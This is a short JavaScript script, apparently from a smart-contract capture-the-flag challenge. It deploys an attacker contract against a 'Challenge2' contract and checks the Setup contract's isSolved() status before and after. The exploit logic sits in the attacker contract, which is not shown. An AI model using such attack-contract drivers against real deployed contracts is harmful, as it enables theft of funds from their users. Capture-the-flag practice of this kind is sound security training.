const { parseEther } = require("ethers/lib/utils");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("teryanarmenAttacker");

  const setup = await ethers.getContractAt( "Setup", "0xAD392F2a981bDE60B43eC988a30ce2aE2d755eD2" );
  const ctf = await ethers.getContractAt( "Challenge2", "0x8720D38BbC9212B8fD202BCcda07cff32b6F7920" );

  console.log("solved:", await setup.isSolved());

  const exploit = await EXPLOIT.deploy(ctf.address);
  await exploit.solve();

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
